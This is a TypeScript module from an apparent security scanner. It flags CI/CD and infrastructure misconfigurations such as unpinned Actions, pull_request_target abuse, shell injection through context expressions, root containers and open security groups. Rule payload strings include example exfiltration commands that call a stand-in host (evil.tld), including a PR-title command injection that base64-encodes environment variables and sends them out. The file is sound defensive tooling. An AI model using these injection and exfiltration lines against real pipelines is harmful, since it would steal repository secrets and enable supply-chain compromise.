// CrackScope Part 18 — CI/CD & pipeline guardrails.
// Scans pipeline and infrastructure files for weaknesses that attackers
// exploit to reach production: unpinned third-party Actions (supply-chain
// via workflow injection), pull_request_target abuse, script injection via
// untrusted GitHub context expressions, over-privileged GITHUB_TOKEN,
// Dockerfile root-user and pinned-tag gaps, and Terraform security-group /
// public-exposure / plaintext-secrets mistakes. Also produces a severity
// gate verdict (pass / block) for pipeline use.
import type { Finding, ScanInput, Severity } from "./scanner";

const OWASP_A05 = "A05:2021 – Security Misconfiguration";
const OWASP_A08 = "A08:2021 – Software and Data Integrity Failures";
const CATEGORY = "CI/CD & Pipeline";

interface PipelineRule {
  id: string;
  title: string;
  severity: Severity;
  description: string;
  remediation: string;
  payload: string;
  pattern: RegExp;
  maxMatchesPerFile: number;
  /** Which file families this rule applies to. */
  applies: (name: string) => boolean;
  safeHints?: string[];
}

const isWorkflow = (name: string) => /(?:^|\/)(?:workflows\/[^/]+\.ya?ml|\.github\/[^/]+\.ya?ml)$/i.test(name);
const isDockerfile = (name: string) => /(?:^|\/)dockerfile(\.\w+)?$/i.test(name);
const isTerraform = (name: string) => /\.tf$/i.test(name);
const isPipeline = (name: string) => isWorkflow(name) || isDockerfile(name) || isTerraform(name);

const RULES: PipelineRule[] = [
  // ---------- GitHub Actions ----------
  {
    id: "CI-001",
    title: "Third-party GitHub Action not pinned to a full commit SHA",
    severity: "high",
    description:
      "A third-party Action is referenced by mutable tag (v4, master). The tag can be repointed to malicious code — the action then runs inside your workflow with access to the repo, secrets, and GITHUB_TOKEN. Full-SHA pinning makes the reference immutable.",
    remediation:
      "Pin every third-party action to a full 40-character commit SHA (with a version comment), e.g. actions/checkout@a5ac7e5… # v4. Update via Dependabot's github-action ecosystems.",
    payload: `Attack: attacker publishes a compromised release/tag on the upstream repo (or hijacks a maintainer account)\nEffect: next workflow run executes attacker code with repo write access and all secrets — full supply-chain compromise.`,
    pattern: /uses\s*:\s*(?!actions\/|github\/|docker\/)[A-Za-z0-9_.-]+\/[A-Za-z0-9_.-]+@(?![0-9a-f]{40}\b)/,
    maxMatchesPerFile: 6,
    applies: isWorkflow,
  },
  {
    id: "CI-002",
    title: "pull_request_target with checkout of untrusted PR code",
    severity: "critical",
    description:
      "pull_request_target runs with read/write repo secrets AND can check out attacker-controlled PR code. Combining them (checkout ref: refs/pull/N/merge followed by running the PR's scripts) is the classic workflow-injection RCE on the runner with production secrets.",
    remediation:
      "Never check out and execute untrusted PR code with pull_request_target. Use pull_request (sandboxed) for code, keep pull_request_target only for label/comment workflows, and pass data between jobs via artifacts — never via checkout.",
    payload: `Attack: attacker opens a PR whose build script exfiltrates secrets: curl -d @.env https://evil.tld\nEffect: workflow runs the attacker's script with GITHUB_TOKEN (write) and repository secrets — repo takeover.`,
    pattern: /pull_request_target/,
    maxMatchesPerFile: 3,
    applies: isWorkflow,
  },
  {
    id: "CI-003",
    title: "Untrusted GitHub context interpolated into run: shell script",
    severity: "critical",
    description:
      "A run: step interpolates a GitHub context expression that attackers control (github.event.pull_request.title, issues, branch names) directly into a shell command. Expression interpolation happens before shell execution — a title like `a\"; curl evil.tld; #` becomes arbitrary command execution on the runner.",
    remediation:
      "Pass untrusted context through environment variables (env: TITLE: ${{ github.event.pull_request.title }}) and reference $TITLE in the script; never inline expressions into run:.",
    payload: `PR title: \${{ github.event.pull_request.title }} = 'x"; curl -s https://evil.tld/$(env | base64); #'\nEffect: injected into run: → arbitrary commands on the runner with workflow-level privileges and secrets.`,
    pattern: /run\s*:\s*.*\$\{\{\s*github\.event\.(?:pull_request|issue|head_commit|commits|comment)/,
    maxMatchesPerFile: 4,
    applies: isWorkflow,
  },
  {
    id: "CI-004",
    title: "Workflow grants excessive GITHUB_TOKEN permissions",
    severity: "medium",
    description:
      "The workflow lacks a permissions block (or grants write-all). The default GITHUB_TOKEN then carries broad write scopes, amplifying any injection or compromised action into repository modification and release tampering.",
    remediation:
      "Add top-level `permissions: {}` and grant the minimal scopes per job (contents: read is enough for most CI). Never use write-all.",
    payload: `Attack: any compromised step (see CI-001/CI-002) uses the default token to push code, tamper releases, or approve PRs\nEffect: blast radius of a single malicious step expands to the whole repository.`,
    pattern: /(?:^|\n)\s*(?:permissions\s*:\s*\{?\s*(?:write-all|"write-all")|(?!.*permissions:)on\s*:)/,
    maxMatchesPerFile: 2,
    applies: isWorkflow,
    safeHints: ["permissions:", "contents: read", "read"],
  },
  {
    id: "CI-005",
    title: "Secrets echoed or passed through unsafe channels",
    severity: "high",
    description:
      "A workflow exposes secrets in ways GitHub's log masking cannot fully protect: echoing them, passing them on command lines (visible in process lists and error output), or writing them to files/artifacts.",
    remediation:
      "Pass secrets via environment variables, never command-line arguments; avoid echo; add `::add-mask::` for custom values; keep secrets out of artifacts and caches.",
    payload: `Attack: read the workflow run logs (or the runner's process list via a compromised step)\nEffect: production credentials harvested from CI logs — a documented, recurring breach pattern.`,
    pattern: /(?:echo|print)\s+(?:.*\$\{\{\s*secrets\.|.*\bsecrets\.[A-Z_]+)/,
    maxMatchesPerFile: 4,
    applies: isWorkflow,
    safeHints: ["add-mask", ">> $GITHUB_ENV", "env:"],
  },
  // ---------- Dockerfile ----------
  {
    id: "CI-006",
    title: "Container runs as root (no USER directive)",
    severity: "medium",
    description:
      "The image has no USER directive, so the container runs as root. Any container escape (kernel exploit, mounted socket abuse) lands with root on the host node — the standard container hardening baseline requires a non-root user.",
    remediation:
      "Create and switch to an unprivileged user (USER app or USER 10001), drop Linux capabilities in the runtime, and enable no-new-privileges.",
    payload: `Attack: exploit a runtime RCE (e.g. path traversal into the container) → root inside the container → escape via privileged mount\nEffect: host node compromise; lateral movement across the cluster.`,
    pattern: /^FROM\s+/im, // presence-of-USER check handled in code
    maxMatchesPerFile: 1,
    applies: isDockerfile,
  },
  {
    id: "CI-007",
    title: "Base image on mutable tag (latest or no tag)",
    severity: "medium",
    description:
      "FROM references no tag or the mutable `latest` tag. Builds are not reproducible, and an upstream tag hijack or compromise flows straight into your image on the next build.",
    remediation:
      "Pin base images to specific version tags (and ideally digests): FROM node:20.11.1-slim@sha256:…. Update deliberately via renovate/dependabot.",
    payload: `Attack: upstream registry account compromise or tag repoint → poisoned 'latest' tag\nEffect: next CI build ships attacker-controlled layers to production.`,
    pattern: /^FROM\s+\S+(?::latest)?\s*$/im,
    maxMatchesPerFile: 2,
    applies: isDockerfile,
  },
  {
    id: "CI-008",
    title: "Secrets baked into image layers (ENV/ADD of credentials)",
    severity: "high",
    description:
      "Credentials are set via ENV or copied via ADD/COPY in the image. Layer history retains every value even in later stages — anyone who can pull the image can extract the secret with `docker history`.",
    remediation:
      "Inject secrets at runtime (runtime env, secret manager, BuildKit --mount=type=secret). Never ENV/ADD credentials; use multi-stage builds and clean layers.",
    payload: `Attack: docker pull the public/leaked image; docker history --no-trunc → ENV lines reveal secrets\nEffect: production API keys extracted from image layers.`,
    pattern: /(?:^|\n)\s*(?:ENV|ADD|COPY)\s+.*(?:SECRET|PASSWORD|API_KEY|TOKEN|PRIVATE_KEY|AWS_)/i,
    maxMatchesPerFile: 4,
    applies: isDockerfile,
    safeHints: ["ARG", "example", "placeholder"],
  },
  // ---------- Terraform / IaC ----------
  {
    id: "IAC-001",
    title: "Security group allows 0.0.0.0/0 ingress on sensitive port",
    severity: "high",
    description:
      "A security group permits ingress from the entire internet on a sensitive port (SSH 22, RDP 3389, databases 3306/5432/6379/27017). Automated mass scanners find and brute-force these within hours of deployment.",
    remediation:
      "Restrict ingress to VPC CIDRs or bastion/VPN addresses; use SSM/IAP instead of open SSH; keep databases private with no public ingress at all.",
    payload: `Attack: masscan the provider's IP ranges for open 22/3306/6379 → credential brute force or unauthenticated access\nEffect: direct entry into the VPC; database dumps; lateral movement.`,
    // Open-CIDR + sensitive-port pairing needs multi-line context; the
    // pattern alone matches the open-CIDR line and the port check is done
    // in code below (see IAC-001 handling in runPipelineScan).
    pattern: /(?:cidr_blocks|cidr_block)\s*=\s*\[["'](?:0\.0\.0\.0\/0|::\/0)["']\]/i,
    maxMatchesPerFile: 4,
    applies: isTerraform,
  },
  {
    id: "IAC-002",
    title: "Sensitive value hardcoded in Terraform (variable default / resource)",
    severity: "high",
    description:
      "A credential appears as a literal in IaC source. Terraform state and VCS history preserve it forever, and plan/apply logs may echo it.",
    remediation:
      "Reference a secret manager (secretsmanager/secret data source or vault), mark variables sensitive, and rotate anything already committed. Never set sensitive defaults.",
    payload: `Attack: read the repo (or the Terraform state bucket) → plaintext credentials\nEffect: infrastructure-level access outside application controls.`,
    pattern: /(?:password|secret|token|api_key)\s*=\s*["'][^"']{8,}["']/i,
    maxMatchesPerFile: 4,
    applies: isTerraform,
    safeHints: ["var.", "data.", "sensitive", "secretsmanager", "vault", "random_password", "example"],
  },
  {
    id: "IAC-003",
    title: "Public exposure of storage or snapshots",
    severity: "high",
    description:
      "A storage resource is provisioned with public access (S3 public ACL, RDS publicly_accessible, EBS/volume snapshots public). Misconfigured-public storage is the single most common cloud data-breach cause.",
    remediation:
      "Block public access at the account/bucket level, keep databases private, and audit snapshots; use CloudFront/OIDC for intended public sharing instead of ACLs.",
    payload: `Attack: enumerate buckets/snapshots with public ACLs (open tooling exists for this)\nEffect: full data exfiltration without touching the application.`,
    pattern: /(?:publicly_accessible\s*=\s*true|acl\s*=\s*["']public-(?:read|read-write)["']|public_access_block[^}]*block_public_acls\s*=\s*false)/i,
    maxMatchesPerFile: 4,
    applies: isTerraform,
  },
];

export interface SeverityGate {
  verdict: "pass" | "warn" | "block";
  reason: string;
  blocking: { ruleId: string; title: string; severity: Severity; file: string; line: number }[];
}

/** Severity gate: block pipelines on critical findings, warn on high. */
export function severityGate(findings: Finding[]): SeverityGate {
  const blocking = findings
    .filter((f) => f.severity === "critical" || f.severity === "high")
    .map((f) => ({ ruleId: f.ruleId, title: f.title, severity: f.severity, file: f.file, line: f.line }));
  if (blocking.some((f) => f.severity === "critical")) {
    return { verdict: "block", reason: `${blocking.filter((f) => f.severity === "critical").length} critical pipeline finding(s)`, blocking };
  }
  if (blocking.length > 0) {
    return { verdict: "warn", reason: `${blocking.length} high finding(s) — review before merge`, blocking };
  }
  return { verdict: "pass", reason: "no critical or high pipeline findings", blocking: [] };
}

/** Run the CI/CD & IaC pass over one file. `excludeLines` skips already-reported lines. */
export function runPipelineScan(input: ScanInput, excludeLines: Set<number>): Finding[] {
  if (!isPipeline(input.name)) return [];
  const lines = input.content.split("\n");
  const findings: Finding[] = [];
  const reportedLines = new Set<number>();

  // CI-006 needs whole-file logic: FROM present but no USER. The FROM line
  // is NOT claimed so CI-007 (mutable tag) can also report on it.
  const fromRule = RULES.find((r) => r.id === "CI-006")!;
  if (fromRule.applies(input.name) && /^FROM\s+/im.test(input.content) && !/^\s*USER\s+/im.test(input.content)) {
    const fromLine = lines.findIndex((l) => /^FROM\s+/i.test(l)) + 1;
    findings.push({
      ruleId: "CI-006",
      title: fromRule.title,
      severity: fromRule.severity,
      category: CATEGORY,
      owasp: OWASP_A05,
      file: input.name,
      line: Math.max(fromLine, 1),
      snippet: (lines[Math.max(fromLine - 1, 0)] ?? "").trim().slice(0, 220),
      description: fromRule.description,
      remediation: fromRule.remediation,
      payload: fromRule.payload,
    });
  }

  // IAC-001 pairing: open CIDR line + sensitive port within the next 5 lines.
  const openCidr = /(?:cidr_blocks|cidr_block)\s*=\s*\[["'](?:0\.0\.0\.0\/0|::\/0)["']\]/i;
  const sensitivePort = /(?:from_port|to_port)\s*=\s*(?:22|3389|3306|5432|6379|27017|1433)\b/;
  for (let i = 0; i < lines.length; i++) {
    if (!openCidr.test(lines[i])) continue;
    const window = lines.slice(i + 1, i + 6).join("\n");
    if (sensitivePort.test(window) || sensitivePort.test(lines[i])) {
      if (!excludeLines.has(i + 1) && !reportedLines.has(i + 1)) {
        const rule = RULES.find((r) => r.id === "IAC-001")!;
        findings.push({
          ruleId: "IAC-001",
          title: rule.title,
          severity: rule.severity,
          category: CATEGORY,
          owasp: OWASP_A05,
          file: input.name,
          line: i + 1,
          snippet: lines[i].trim().slice(0, 220),
          description: rule.description,
          remediation: rule.remediation,
          payload: rule.payload,
        });
        reportedLines.add(i + 1);
      }
    }
  }

  for (let i = 0; i < lines.length; i++) {
    const line = lines[i];
    const trimmed = line.trim();
    if (!trimmed || trimmed.startsWith("#")) continue;
    if (excludeLines.has(i + 1) || reportedLines.has(i + 1)) continue;

    for (const rule of RULES) {
      if (rule.id === "CI-006" || rule.id === "IAC-001") continue; // handled above
      if (!rule.applies(input.name)) continue;
      const m = rule.pattern.exec(line);
      if (!m) continue;
      if (rule.safeHints?.some((h) => line.toLowerCase().includes(h.toLowerCase()))) continue;

      findings.push({
        ruleId: rule.id,
        title: rule.title,
        severity: rule.severity,
        category: CATEGORY,
        owasp: rule.id === "CI-001" || rule.id === "CI-002" ? OWASP_A08 : OWASP_A05,
        file: input.name,
        line: i + 1,
        snippet: trimmed.slice(0, 220),
        description: rule.description,
        remediation: rule.remediation,
        payload: rule.payload,
      });
      reportedLines.add(i + 1);
      break;
    }
  }
  return findings;
}
